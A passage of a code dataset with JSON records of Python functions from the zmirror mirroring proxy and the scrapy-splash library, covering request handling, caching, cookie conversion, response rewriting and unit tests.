1838}
{"docstring": "\"\"\"\nFor CC98 identity verify\n\n:type identity_dict: dict\n\"\"\"\n", "func_signal": "def demo__custom_identity_verify(identity_dict):\n", "code": "import hashlib\nimport requests\nimport config\n\nif 'cc98_username' not in identity_dict or 'cc98_password' not in identity_dict:\n    return False\n\ntry:\n    pass_md5 = hashlib.md5()\n    pass_md5.update(identity_dict['cc98_password'].encode())\n    pass_md5 = pass_md5.hexdigest()\n    if config.is_use_proxy:\n        proxy = config.requests_proxies\n    else:\n        proxy = None\n    r = requests.post('http://www.cc98.org/sign.asp', data={\n        'a': 'i',\n        'u': identity_dict['cc98_username'],\n        'p': pass_md5,\n        'userhidden': 2\n    }, proxies=proxy)\n    if r.text == '9898':\n        return True\n    else:\n        return False\nexcept:\n    return False", "path": "zmirror/custom_func.sample.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"\nReturn True and False, if False, user's access will not be granted.\nAn dict contains user's identity will be passed to this function.\n   You can do some verification, for example, you can try to login to an internal site,\nif login succeed, you return True, otherwise False\n\n:type identity_dict: dict\n\"\"\"\n", "func_signal": "def custom_identity_verify(identity_dict):\n", "code": "true_or_false = True\nreturn true_or_false", "path": "zmirror/custom_func.sample.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "# 0 should clear from the cursor to the end of the screen.\n# 1 should clear from the cursor to the beginning of the screen.\n# 2 should clear the entire screen, and move cursor to (1,1)\n", "func_signal": "def erase_screen(self, mode=0, on_stderr=False):\n", "code": "handle = win32.STDOUT\nif on_stderr:\n    handle = win32.STDERR\ncsbi = win32.GetConsoleScreenBufferInfo(handle)\n# get the number of character cells in the current buffer\ncells_in_screen = csbi.dwSize.X * csbi.dwSize.Y\n# get number of character cells before current cursor position\ncells_before_cursor = csbi.dwSize.X * csbi.dwCursorPosition.Y + csbi.dwCursorPosition.X\nif mode == 0:\n    from_coord = csbi.dwCursorPosition\n    cells_to_erase = cells_in_screen - cells_before_cursor\nif mode == 1:\n    from_coord = win32.COORD(0, 0)\n    cells_to_erase = cells_before_cursor\nelif mode == 2:\n    from_coord = win32.COORD(0, 0)\n    cells_to_erase = cells_in_screen\n# fill the entire screen with blanks\nwin32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n# now set the buffer's attributes accordingly\nwin32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\nif mode == 2:\n    # put the cursor where needed\n    win32.SetConsoleCursorPosition(handle, (1, 1))", "path": "zmirror/zmirror/external_pkgs/ColorfulPyPrint/thirdparty/colorama/winterm.py", "commit_date": "2016-08-28 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"https://httpbin.org/user-agent\"\"\"\n\n", "func_signal": "def test_user_agent(self):\n", "code": "self.rv = self.client.get(\n    self.url(\"/user-agent\"),\n    environ_base=env(),\n    headers=headers(),\n)  # type: Response\n\nself.assertEqual(load_rv_json(self.rv)['user-agent'], DEFAULT_USER_AGENT, msg=self.dump())", "path": "zmirror/tests/test_httpbin.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\":rtype: Union[bytes, None]\"\"\"\n", "func_signal": "def request_data_encoded(self):\n", "code": "if isinstance(self.request_data, str):\n    return self.request_data.encode(encoding=self.request_data_encoding or 'utf-8')\nelse:\n    return self.request_data", "path": "zmirror/zmirror/threadlocal.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"\nAllow you do some custom modifications/rewrites to the response content.\n    eg: add your own statistic code\nOnly text content (txt/html/css/js/json) would be passed to this function\n\nNotice: the remote response \"Location\" headers(occurs in 301/302/307) will be passed to this function too,\n    with an special content_mime as \"mwm/headers-location\"\n\nPlease remember to set `custom_text_rewriter_enable` to True in the config\n\n(\u8bf7\u5148\u770b\u5b8c\u4e0a\u9762\u7684\u82f1\u6587)\n\u5728\u7b80\u5355\u60c5\u51b5\u4e0b, \u4f60\u53ef\u4ee5\u53ea\u5bf9\u6e90\u7ad9\u7684\u54cd\u5e94\u6587\u672c\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u4e0a\u7684\u4fee\u6539(\u6bd4\u5982\u6dfb\u52a0\u4f60\u81ea\u5df1\u7684\u7edf\u8ba1\u4ee3\u7801, \u6539\u4e00\u4e9b\u6587\u5b57\u4e4b\u7c7b)\n\n\u7a0d\u5fae\u590d\u6742\u4e00\u70b9, \u4f60\u8fd8\u53ef\u4ee5\u8c03\u7528zmirror\u672c\u8eab\u7684\u5176\u4ed6\u5b9e\u7528\u51fd\u6570,\n  \u4ee5\u5185\u7f6etwitter\u955c\u50cf\u4e3a\u4f8b, \u5b83\u8c03\u7528\u4e86zmirror\u5185\u7f6e\u7684 encode_mirror_url() \u51fd\u6570, \u6765\u5c06url\u8f6c\u5316\u4e3a\u955c\u50cfurl\n\n\u66f4\u52a0\u9ad8\u7ea7\u4e00\u70b9, \u5728\u81ea\u5b9a\u4e49\u91cd\u5199\u51fd\u6570\u4e2d, \u8fd8\u80fd\u5f71\u54cdzmirror\u672c\u8eab\u7684\u884c\u4e3a,\n  \u6bd4\u5982\u53ef\u4ee5\u901a\u8fc7 try_match_and_add_domain_to_rewrite_white_list() \u52a8\u6001\u6dfb\u52a0\u57df\u540d\u5230\u91cd\u5199\u540d\u5355(external_domains)\u4e2d,\n\n:param raw_text: raw response html/css/js text content\n:type raw_text: str\n:param content_mime: response's mime\n:type content_mime: str\n:param remote_url: remote url\n:type remote_url: str\n:return: modified response text content\n:rtype: str\n\"\"\"\n\n# Tips: If you can use plain string.replace, DO NOT USE REGEX, because regex is hundreds times slower than string.replace\n# string.replace won't cause performance problem\n\n# Example: replace UBB image to image tag\n# eg. from [upload=jpg]http://foo.bar/blah.jpg[/upload]\n#     to <img src=\"http://foo.bar/blah.jpg\"></img>\n", "func_signal": "def custom_response_text_rewriter(raw_text, content_mime, remote_url):\n", "code": "raw_text = regex_ubb_img_rewriter.sub(r'<img src=\"\\g<image_url>\" style=\"max-width: 100%;\"></img>', raw_text)\n\n# Example: For twitter expand replace\nregex_twitter_data_expanded.sub(demo__handle_expand_url, raw_text)\n\nif 'search' in remote_url and (content_mime == 'text/html' or content_mime == 'application/json'):\n    raw_text = demo__google_result_open_in_new_tab(raw_text, content_mime)\n\n# Example: remove google analytics\nraw_text = raw_text.replace('www.google-analytics.com/analytics.js', '')\n\n# Example: Add your own analytics codes\nif content_mime == 'text/html':\n    # Your statistic code\n    my_statistic_code = r\"\"\"<!--Your Own Statistic Code-->\"\"\"\n    # Add to just before the html head\n    raw_text = raw_text.replace('</head>', my_statistic_code + '</head>', 1)\n\nreturn raw_text", "path": "zmirror/custom_func.sample.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "# \u521d\u59cb\u5316\u6210\u7a7a\u767d\u503c\n", "func_signal": "def init(self):\n", "code": "self.method = None\nself.remote_domain = None\nself.is_external_domain = None\nself.is_https = None\nself.remote_url = None\nself.url_no_scheme = None\nself.remote_path_query = None\nself.client_header = None\nself.content_type = None\nself.remote_path = None\nself.mime = None\nself.cache_control = None\nself.remote_response = None\nself.streamed_our_response = False\nself.cacheable = False\nself.request_data = None\nself.request_data_encoding = None\nself.time = {}\nself.extra_resp_headers = {}\nself.temporary_domain_alias = []\nself.extra_cookies = {}", "path": "zmirror/zmirror/threadlocal.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"\n\u5c06\u4e00\u4e2a\u5bf9\u8c61\u5b58\u5165\u7f13\u5b58\n:param key: key\n:param last_modified: str  format: \"Mon, 18 Nov 2013 09:02:42 GMT\"\n:param obj_size: too big object should not be cached\n:param expires: seconds to expire\n:param info_dict: custom dict contains information, stored in memory, so can access quickly\n:type key: str\n:type last_modified: str\n:type info_dict: dict or None\n:type obj: Any\n\"\"\"\n", "func_signal": "def put_obj(self, key, obj, expires=DEFAULT_EXPIRE, obj_size=0, last_modified=None, info_dict=None):\n", "code": "if expires <= 0 or obj_size > self.max_size_byte:\n    return False\n\nself.delete(key)\n\ntemp_file = tempfile.NamedTemporaryFile(prefix=\"zmirror_\", suffix=\".tmp\", delete=False)\npickle.dump(obj, temp_file, protocol=pickle.HIGHEST_PROTOCOL)\n\ncache_item = (\n    temp_file.name,  # 0 cache file path\n    info_dict,  # 1 custom dict contains information\n    int(time.time()),  # 2 added time (unix time)\n    expires,  # 3 expires second\n    _time_str_to_unix(last_modified),  # 4 last modified, unix time\n)\ntemp_file.close()\nself.items_dict[key] = cache_item\nreturn True", "path": "zmirror/zmirror/cache_system.py", "commit_date": "2016-09-18 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "# 0 should clear from the cursor to the end of the line.\n# 1 should clear from the cursor to the beginning of the line.\n# 2 should clear the entire line.\n", "func_signal": "def erase_line(self, mode=0, on_stderr=False):\n", "code": "handle = win32.STDOUT\nif on_stderr:\n    handle = win32.STDERR\ncsbi = win32.GetConsoleScreenBufferInfo(handle)\nif mode == 0:\n    from_coord = csbi.dwCursorPosition\n    cells_to_erase = csbi.dwSize.X - csbi.dwCursorPosition.X\nif mode == 1:\n    from_coord = win32.COORD(0, csbi.dwCursorPosition.Y)\n    cells_to_erase = csbi.dwCursorPosition.X\nelif mode == 2:\n    from_coord = win32.COORD(0, csbi.dwCursorPosition.Y)\n    cells_to_erase = csbi.dwSize.X\n# fill the entire screen with blanks\nwin32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n# now set the buffer's attributes accordingly\nwin32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)", "path": "zmirror/zmirror/external_pkgs/ColorfulPyPrint/thirdparty/colorama/winterm.py", "commit_date": "2016-08-28 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"https://httpbin.org/headers\"\"\"\n", "func_signal": "def test_headers(self):\n", "code": "with self.app.test_client() as c:\n    self.rv = c.get(\n        self.url(\"/headers\"),\n        environ_base=env(),\n        headers=headers(\n            accept_encoding=\"gzip, deflate, sdch, br\",\n            others={\n                \"Host\": self.C.my_host_name,\n                \"Referer\": self.url(\"/extdomains/eu.httpbin.org/headers\"),\n                \"Cookie\": \"_ga=GA1.2.1161994079.1471765883\",\n                \"Hello-World\": \"love_luciaz\",\n            }),\n    )  # type: Response\n\n    # \u767d\u76d2\u68c0\u67e5\n    parse_values = attributes(self.zmirror.parse)\n    self.assertEqual(\"application/json\", self.zmirror.parse.content_type, msg=self.dump())\n\n    self.assertEqual(\n        \"gzip, deflate\",\n        self.zmirror.parse.client_header['accept-encoding'],\n        msg=parse_values\n    )\n    self.assertEqual(\n        \"https://eu.httpbin.org/headers\",\n        self.zmirror.parse.client_header['referer'],\n        msg=self.dump()\n    )\n    self.assertEqual(\n        \"love_luciaz\",\n        self.zmirror.parse.client_header['hello-world'],\n        msg=self.dump()\n    )\n    self.assertEqual(\"httpbin.org\", self.zmirror.parse.remote_domain, msg=self.dump())\n    self.assertEqual(\"/headers\", self.zmirror.parse.remote_path, msg=self.dump())\n\n    remote_resp = self.zmirror.parse.remote_response  # type: requests.Response\n    remote_resp_json = json.loads(remote_resp.text)  # type: dict\n    self.assertEqual(self.C.target_domain, remote_resp_json['headers']['Host'], msg=self.dump())\n\n    # \u9ed1\u76d2\u68c0\u67e5\n    h = load_rv_json(self.rv)['headers']\n    self.assertEqual(self.C.my_host_name, h['Host'], msg=self.dump())\n    self.assertEqual(self.url(\"/extdomains/eu.httpbin.org/headers\"), h['Referer'], msg=self.dump())\n    self.assertEqual(\"_ga=GA1.2.1161994079.1471765883\", h['Cookie'], msg=self.dump())\n    self.assertEqual(\"love_luciaz\", h['Hello-World'], msg=self.dump())\n    self.assertEqual(\"gzip, deflate\", h['Accept-Encoding'], msg=self.dump())", "path": "zmirror/tests/test_httpbin.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"https://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F\"\"\"\n", "func_signal": "def test_relative_redirect_to_2(self):\n", "code": "self.rv = self.client.get(\n    self.url(\"/redirect-to\"),\n    query_string=\"url=http%3A%2F%2Feu.httpbin.org%2F\",\n    environ_base=env(),\n    headers=headers(),\n)  # type: Response\nself.assertEqual(self.url(\"/extdomains/eu.httpbin.org/\"), self.rv.location, msg=self.dump())", "path": "zmirror/tests/test_httpbin.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"Force google search's result to open in new tab. to avoid iframe problem\n\u5728\u65b0\u6807\u7b7e\u9875\u4e2d\u6253\u5f00google\u641c\u7d22\u7ed3\u679c\n\"\"\"\n\n", "func_signal": "def demo__google_result_open_in_new_tab(raw_text, content_mime):\n", "code": "def hexlify_to_json(ascii_str):\n    _buff = ''\n    for char in ascii_str:\n        if char in '\\'\\\"<>&=':\n            _buff += r'\\x' + hex(ord(char))[2:]\n        else:\n            _buff += char\n    _buff = _buff.replace('\\\\', '\\\\\\\\')\n    _buff = _buff.replace('/', r'\\/')\n    return _buff\n\nif content_mime == 'application/json':\n    raw_text = raw_text.replace(\n        hexlify_to_json('<h3 class=\"r\"><a href=\"'),\n        hexlify_to_json('<h3 class=\"r\"><a target=\"_blank\" href=\"')\n    )\n    raw_text = raw_text.replace(\n        hexlify_to_json('<h3 class=\"r\"><a class=\"l\" href=\"'),\n        hexlify_to_json('<h3 class=\"r\"><a target=\"_blank\" class=\"l\" href=\"')\n    )\nelse:\n    raw_text = raw_text.replace('<h3 class=\"r\"><a href=\"', '<h3 class=\"r\"><a target=\"_blank\" href=\"')\n    raw_text = raw_text.replace('<h3 class=\"r\"><a class=\"l\" href=\"', '<h3 class=\"r\"><a target=\"_blank\" class=\"l\" href=\"')\n\nreturn raw_text", "path": "zmirror/custom_func.sample.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"\nReturn a hash for any JSON-serializable value.\n\n>>> json_based_hash({\"foo\": \"bar\", \"baz\": [1, 2]})\n'0570066939bea46c610bfdc35b20f37ef09d05ed'\n\"\"\"\n", "func_signal": "def json_based_hash(value):\n", "code": "fp = _fast_hash(value)\nif fp not in _hash_cache:\n    _hash_cache[fp] = _json_based_hash(_process(value, sha=True))\nreturn _hash_cache[fp]", "path": "scrapy-splash/scrapy_splash/utils.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"Guess the most appropriate Response class based on\nthe given arguments.\"\"\"\n", "func_signal": "def from_args(self, headers=None, url=None, filename=None, body=None):\n", "code": "cls = super(SplashResponseTypes, self).from_args(\n    headers=headers,\n    url=url,\n    filename=filename,\n    body=body\n)\nif cls is Response:\n    cls = scrapy_splash.SplashResponse\nreturn cls", "path": "scrapy-splash/scrapy_splash/responsetypes.py", "commit_date": "2016-04-11 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\" Return a hash for a dict, based on its contents \"\"\"\n", "func_signal": "def dict_hash(obj, start=''):\n", "code": "h = hashlib.sha1(to_bytes(start))\nh.update(to_bytes(obj.__class__.__name__))\nif isinstance(obj, dict):\n    for key, value in sorted(obj.items()):\n        h.update(to_bytes(key))\n        h.update(to_bytes(dict_hash(value)))\nelif isinstance(obj, (list, tuple)):\n    for el in obj:\n        h.update(to_bytes(dict_hash(el)))\nelse:\n    # basic types\n    if isinstance(obj, bool):\n        value = str(int(obj))\n    elif isinstance(obj, (six.integer_types, float)):\n        value = str(obj)\n    elif isinstance(obj, (six.text_type, bytes)):\n        value = obj\n    elif obj is None:\n        value = b''\n    else:\n        raise ValueError(\"Unsupported value type: %s\" % obj.__class__)\n    h.update(to_bytes(value))\nreturn h.hexdigest()", "path": "scrapy-splash/scrapy_splash/utils.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"\nReplace requested meta['splash']['args'] values with their fingerprints.\nThis allows to store values only once in request queue, which helps\nwith disk queue size.\n\nDownloader middleware should restore the values from fingerprints.\n\"\"\"\n", "func_signal": "def _process_request(self, request, spider):\n", "code": "if 'splash' not in request.meta:\n    return request\n\nif '_replaced_args' in request.meta['splash']:\n    # don't process re-scheduled requests\n    # XXX: does it work as expected?\n    warnings.warn(\"Unexpected request.meta['splash']['_replaced_args']\")\n    return request\n\nrequest.meta['splash']['_replaced_args'] = []\ncache_args = request.meta['splash'].get('cache_args', [])\nargs = request.meta['splash'].setdefault('args', {})\n\nfor name in cache_args:\n    if name not in args:\n        continue\n    value = args[name]\n    fp = 'LOCAL+' + json_based_hash(value)\n    spider.state[self.local_values_key][fp] = value\n    args[name] = fp\n    request.meta['splash']['_replaced_args'].append(name)\n\nreturn request", "path": "scrapy-splash/scrapy_splash/middleware.py", "commit_date": "2018-01-16 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\" Keep track of arguments saved by Splash. \"\"\"\n", "func_signal": "def _process_x_splash_saved_arguments(self, request, response):\n", "code": "saved_args = get_splash_headers(response).get(b'X-Splash-Saved-Arguments')\nif not saved_args:\n    return\nsaved_args = parse_x_splash_saved_arguments_header(saved_args)\narg_fingerprints = request.meta['splash']['_local_arg_fingerprints']\nfor name, key in saved_args.items():\n    fp = arg_fingerprints[name]\n    self._remote_keys[fp] = key", "path": "scrapy-splash/scrapy_splash/middleware.py", "commit_date": "2018-01-16 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"\nParse X-Splash-Saved-Arguments header value.\n\n>>> value = u\"name1=9a6747fc6259aa374ab4e1bb03074b6ec672cf99;name2=ba001160ef96fe2a3f938fea9e6762e204a562b3\"\n>>> dct = parse_x_splash_saved_arguments_header(value)\n>>> sorted(list(dct.keys()))\n['name1', 'name2']\n>>> dct['name1']\n'9a6747fc6259aa374ab4e1bb03074b6ec672cf99'\n>>> dct['name2']\n'ba001160ef96fe2a3f938fea9e6762e204a562b3'\n\nBinary header values are also supported:\n>>> dct2 = parse_x_splash_saved_arguments_header(value.encode('utf8'))\n>>> dct2 == dct\nTrue\n\"\"\"\n", "func_signal": "def parse_x_splash_saved_arguments_header(value):\n", "code": "value = to_unicode(value)\nreturn dict(kv.split('=', 1) for kv in  value.split(\";\"))", "path": "scrapy-splash/scrapy_splash/utils.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"\nReturn scrapy.http.Headers instance from headers data.\n3 data formats are supported:\n\n* {name: value, ...} dict;\n* [(name, value), ...] list;\n* [{'name': name, 'value': value'}, ...] list (HAR headers format).\n\"\"\"\n", "func_signal": "def headers_to_scrapy(headers):\n", "code": "if isinstance(headers or {}, dict):\n    return Headers(headers or {})\n\nif isinstance(headers[0], dict):\n    return Headers([\n        (d['name'], d.get('value', ''))\n        for d in headers\n    ])\n\nreturn Headers(headers)", "path": "scrapy-splash/scrapy_splash/utils.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"\nFor Splash requests add 'cookies' key with current\ncookies to ``request.meta['splash']['args']`` and remove cookie\nheaders sent to Splash itself.\n\"\"\"\n", "func_signal": "def process_request(self, request, spider):\n", "code": "if 'splash' not in request.meta:\n    return\n\nif request.meta.get('_splash_processed'):\n    request.headers.pop('Cookie', None)\n    return\n\nsplash_options = request.meta['splash']\n\nsplash_args = splash_options.setdefault('args', {})\nif 'cookies' in splash_args:  # cookies already set\n    return\n\nif 'session_id' not in splash_options:\n    return\n\njar = self.jars[splash_options['session_id']]\n\ncookies = self._get_request_cookies(request)\nhar_to_jar(jar, cookies)\n\nsplash_args['cookies'] = jar_to_har(jar)\nself._debug_cookie(request, spider)", "path": "scrapy-splash/scrapy_splash/middleware.py", "commit_date": "2018-01-16 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\" Add HAR cookies to the cookiejar.\nIf request_cookies is given, remove cookies absent from har_cookies\nbut present in request_cookies (they were removed). \"\"\"\n", "func_signal": "def har_to_jar(cookiejar, har_cookies, request_cookies=None):\n", "code": "har_cookie_keys = set()\nfor c in har_cookies:\n    cookie = har_to_cookie(c)\n    cookiejar.set_cookie(cookie)\n    har_cookie_keys.add(_cookie_key(cookie))\nif request_cookies:\n    for c in request_cookies:\n        cookie = har_to_cookie(c)\n        if _cookie_key(cookie) not in har_cookie_keys:\n            # We sent it but it did not come back: remove it\n            try:\n                cookiejar.clear(cookie.domain, cookie.path, cookie.name)\n            except KeyError:\n                pass  # It could have been already removed", "path": "scrapy-splash/scrapy_splash/cookies.py", "commit_date": "2016-04-11 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\" Fill response attributes from JSON results \"\"\"\n\n# response.status\n", "func_signal": "def _load_from_json(self):\n", "code": "if 'http_status' in self.data:\n    self.status = int(self.data['http_status'])\nelif self._splash_options().get('http_status_from_error_code', False):\n    if 'error' in self.data:\n        try:\n            error = self.data['info']['error']\n        except KeyError:\n            error = ''\n        http_code_m = re.match(r'http(\\d{3})', error)\n        if http_code_m:\n            self.status = int(http_code_m.group(1))\n\n# response.url\nif 'url' in self.data:\n    self._url = self.data['url']\n\n# response.body\nif 'body' in self.data:\n    self._body = base64.b64decode(self.data['body'])\n    self._cached_ubody = self._body.decode(self.encoding)\nelif 'html' in self.data:\n    self._cached_ubody = self.data['html']\n    self._body = self._cached_ubody.encode(self.encoding)\n    self.headers[b\"Content-Type\"] = b\"text/html; charset=utf-8\"\n\n# response.headers\nif 'headers' in self.data:\n    self.headers = headers_to_scrapy(self.data['headers'])", "path": "scrapy-splash/scrapy_splash/response.py", "commit_date": "2018-01-16 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "# Copied from scrapy tests (test_from_response_submit_not_first_clickable)\n", "func_signal": "def test_form_request_from_response():\n", "code": "def _buildresponse(body, **kwargs):\n    kwargs.setdefault('body', body)\n    kwargs.setdefault('url', 'http://example.com')\n    kwargs.setdefault('encoding', 'utf-8')\n    return HtmlResponse(**kwargs)\nresponse = _buildresponse(\n    \"\"\"<form action=\"get.php\" method=\"GET\">\n    <input type=\"submit\" name=\"clickable1\" value=\"clicked1\">\n    <input type=\"hidden\" name=\"one\" value=\"1\">\n    <input type=\"hidden\" name=\"two\" value=\"3\">\n    <input type=\"submit\" name=\"clickable2\" value=\"clicked2\">\n    </form>\"\"\")\nreq = SplashFormRequest.from_response(\n    response, formdata={'two': '2'}, clickdata={'name': 'clickable2'})\nassert req.method == 'GET'\nassert req.meta['splash']['args']['url'] == req.url\nfs = parse_qs(req.url.partition('?')[2], True)\nassert fs['clickable2'] == ['clicked2']\nassert 'clickable1' not in fs\nassert fs['one'] == ['1']\nassert fs['two'] == ['2']", "path": "scrapy-splash/tests/test_request.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\" Request fingerprint which takes 'splash' meta key into account \"\"\"\n\n", "func_signal": "def splash_request_fingerprint(request, include_headers=None):\n", "code": "fp = request_fingerprint(request, include_headers=include_headers)\nif 'splash' not in request.meta:\n    return fp\n\nsplash_options = deepcopy(request.meta['splash'])\nargs = splash_options.setdefault('args', {})\n\nif 'url' in args:\n    args['url'] = canonicalize_url(args['url'], keep_fragments=True)\n\nreturn dict_hash(splash_options, fp)", "path": "scrapy-splash/scrapy_splash/dupefilter.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"\nConvert a cookie dict in HAR format to a Cookie instance.\n\n>>> har_cookie =  {\n...     \"name\": \"TestCookie\",\n...     \"value\": \"Cookie Value\",\n...     \"path\": \"/foo\",\n...     \"domain\": \"www.janodvarko.cz\",\n...     \"expires\": \"2009-07-24T19:20:30Z\",\n...     \"httpOnly\": True,\n...     \"secure\": True,\n...     \"comment\": \"this is a test\"\n... }\n>>> cookie = har_to_cookie(har_cookie)\n>>> cookie.name\n'TestCookie'\n>>> cookie.value\n'Cookie Value'\n>>> cookie.port\n>>> cookie.domain\n'www.janodvarko.cz'\n>>> cookie.path\n'/foo'\n>>> cookie.secure\nTrue\n>>> cookie.expires\n1248463230\n>>> cookie.comment\n'this is a test'\n>>> cookie.get_nonstandard_attr('HttpOnly')\nTrue\n\"\"\"\n\n", "func_signal": "def har_to_cookie(har_cookie):\n", "code": "expires_timestamp = None\nif har_cookie.get('expires'):\n    expires = time.strptime(har_cookie['expires'], \"%Y-%m-%dT%H:%M:%SZ\")\n    expires_timestamp = calendar.timegm(expires)\n\nkwargs = dict(\n    version=har_cookie.get('version') or 0,\n    name=har_cookie['name'],\n    value=har_cookie['value'],\n    port=None,\n    domain=har_cookie.get('domain', ''),\n    path=har_cookie.get('path', '/'),\n    secure=har_cookie.get('secure', False),\n    expires=expires_timestamp,\n    discard=False,\n    comment=har_cookie.get('comment'),\n    comment_url=bool(har_cookie.get('comment')),\n    rest={'HttpOnly': har_cookie.get('httpOnly')},\n    rfc2109=False,\n)\nkwargs['port_specified'] = bool(kwargs['port'])\nkwargs['domain_specified'] = bool(kwargs['domain'])\nkwargs['domain_initial_dot'] = kwargs['domain'].startswith('.')\nkwargs['path_specified'] = bool(kwargs['path'])\nreturn Cookie(**kwargs)", "path": "scrapy-splash/scrapy_splash/cookies.py", "commit_date": "2016-04-11 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "# prepare middlewares\n", "func_signal": "def test_magic_response_caching(tmpdir):\n", "code": "spider = scrapy.Spider(name='foo')\ncrawler = _get_crawler({\n    'HTTPCACHE_DIR': str(tmpdir.join('cache')),\n    'HTTPCACHE_STORAGE': 'scrapy_splash.SplashAwareFSCacheStorage',\n    'HTTPCACHE_ENABLED': True\n})\ncache_mw = HttpCacheMiddleware.from_crawler(crawler)\nmw = _get_mw()\ncookie_mw = _get_cookie_mw()\n\ndef _get_req():\n    return SplashRequest(\n        url=\"http://example.com\",\n        endpoint='execute',\n        magic_response=True,\n        args={'lua_source': 'function main(splash) end'},\n    )\n\n# Emulate Scrapy middleware chain.\n\n# first call\nreq = _get_req()\nreq = cookie_mw.process_request(req, spider) or req\nreq = mw.process_request(req, spider)\nreq = cache_mw.process_request(req, spider) or req\nassert isinstance(req, scrapy.Request)  # first call; the cache is empty\n\nresp_data = {\n    'html': \"<html><body>Hello</body></html>\",\n    'render_time': 0.5,\n}\nresp_body = json.dumps(resp_data).encode('utf8')\nresp = TextResponse(\"http://example.com\",\n                    headers={b'Content-Type': b'application/json'},\n                    body=resp_body)\n\nresp2 = cache_mw.process_response(req, resp, spider)\nresp3 = mw.process_response(req, resp2, spider)\nresp3 = cookie_mw.process_response(req, resp3, spider)\n\nassert resp3.text == \"<html><body>Hello</body></html>\"\nassert resp3.css(\"body\").extract_first() == \"<body>Hello</body>\"\nassert resp3.data['render_time'] == 0.5\n\n# second call\nreq = _get_req()\nreq = cookie_mw.process_request(req, spider) or req\nreq = mw.process_request(req, spider)\ncached_resp = cache_mw.process_request(req, spider) or req\n\n# response should be from cache:\nassert cached_resp.__class__ is TextResponse\nassert cached_resp.body == resp_body\nresp2_1 = cache_mw.process_response(req, cached_resp, spider)\nresp3_1 = mw.process_response(req, resp2_1, spider)\nresp3_1 = cookie_mw.process_response(req, resp3_1, spider)\n\nassert isinstance(resp3_1, scrapy_splash.SplashJsonResponse)\nassert resp3_1.body == b\"<html><body>Hello</body></html>\"\nassert resp3_1.text == \"<html><body>Hello</body></html>\"\nassert resp3_1.css(\"body\").extract_first() == \"<body>Hello</body>\"\nassert resp3_1.data['render_time'] == 0.5\nassert resp3_1.headers[b'Content-Type'] == b'text/html; charset=utf-8'", "path": "scrapy-splash/tests/test_middleware.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
